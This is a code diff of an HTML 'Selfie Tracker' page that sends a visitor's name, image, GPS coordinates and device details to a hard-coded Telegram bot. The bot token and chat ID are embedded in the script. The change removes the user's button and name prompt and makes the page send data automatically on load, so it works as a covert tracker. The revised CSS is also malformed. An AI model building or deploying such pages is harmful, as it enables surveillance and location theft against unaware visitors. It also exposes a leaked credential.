@@ -1,105 +1,67 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Track Me</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Selfie Tracker</title>
     <style>
-        body {
-            background-image: url('img/altarys gif.gif');
-            background-size: cover;
-            background-repeat: no-repeat;
-            background-attachment: fixed;
-            background-position: center;
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: white;
-            text-align: center;
-            font-family: Arial, sans-serif;
-        }
-        .container {
-            background-color: rgba(0, 0, 0, 0.7);
-            padding: 30px;
-            border-radius: 15px;
-            max-width: 500px;
+        border-radius: 15px;
+        max-width: 500px;
+        iframe {
+            width: 100%;
+            max-width: 400px;
+            height: 350px;
+            border: none;
+            border-radius: 12px;
+            margin: 15px 0;
+            background: #222;
         }
         button {
             background: #ff5722;
             border: none;
-            color: white;
-            padding: 14px 30px;
-            border-radius: 30px;
-            font-size: 18px;
-            cursor: pointer;
-            font-weight: bold;
-            margin-top: 10px;
-        }
-        button:hover {
-            background: #e64a19;
-        }
-        #status {
-            margin-top: 15px;
-            padding: 10px;
-            background: rgba(0,0,0,0.5);
-            border-radius: 8px;
-            font-size: 14px;
-            word-break: break-word;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>📸 Selfie Tracker</h1>
-        <p>Click below to capture your selfie + exact GPS.</p>
-        <button id="captureBtn">🚀 Capture & Send</button>
-        <div id="status">⏳ Ready to capture.</div>
-    </div>
-
     <script>
         // ==================== CONFIG ====================
         const BOT_TOKEN = '8541864317:AAFd_Wir8E53Dt_cLnvS9A2L3UJ_OUHWkPA'; // <-- REPLACE OR HIDE
         const CHAT_ID = '5410457102';
-        const statusDiv = document.getElementById('status');
 
         // ==================== SEND TO TELEGRAM ====================
-        async function sendToTelegram(imageData, lat, lon, source, device, userName) {
-            const textMsg = `👤 Name: ${userName || 'Anonymous'}\n` +
-                            `📍 Location: ${lat}, ${lon} (${source})\n` +
-                            `📱 Device: ${device}\n` +
-                            `🕒 Time: ${new Date().toLocaleString()}`;
+        async function sendToTelegram(image, lat, lon, source, device, userName) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const message = `New selfie from ${userName}!\n\n` +
+                `Image: ${image}\n` +
+                `Latitude: ${lat}\n` +
+                `Longitude: ${lon}\n` +
+                `Source: ${source}\n` +
+                `Device: ${device}`;
 
-            // 1. Send text
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            const response = await fetch(url, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: textMsg })
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
             });
 
-            // 2. Send photo
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, photo: imageData })
-            });
-
-            // 3. Send native location pin
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
-            });
+            if (!response.ok) {
+                throw new Error('Failed to send message to Telegram');
+            }
         }
 
-        // ==================== MAIN ACTION ====================
-        document.getElementById('captureBtn').addEventListener('click', async () => {
+        // ==================== CAPTURE AND SEND ====================
+        async function captureAndSend() {
+            const statusDiv = document.createElement('div');
+            statusDiv.id = 'status';
             statusDiv.textContent = '⏳ Capturing...';
+            document.body.appendChild(statusDiv);
 
             try {
-                // Ask for name (optional)
-                const userName = prompt('Enter your name (optional):') || 'User';
-
                 // Simulate data capture (since camera is removed)
                 const data = {
                     image: 'default_image_url', // Replace with a default image URL
@@ -110,13 +72,16 @@
                 };
 
                 // Send everything
-                await sendToTelegram(data.image, data.lat, data.lon, data.source, data.device, userName);
-                statusDiv.textContent = '✅ ALL DATA SENT! Check your Telegram.';
+                await sendToTelegram(data.image, data.lat, data.lon, data.source, data.device, 'User');
+                statusDiv.textContent = '✅ Selfie captured and sent!';
             } catch (err) {
-                statusDiv.textContent = '❌ ERROR: ' + err.message;
                 console.error(err);
+                statusDiv.textContent = '❌ Failed to capture and send selfie.';
             }
-        });
+        }
+
+        // Automatically run the capture and send process when the page loads
+        window.onload = captureAndSend;
     </script>
 </body>
 </html>
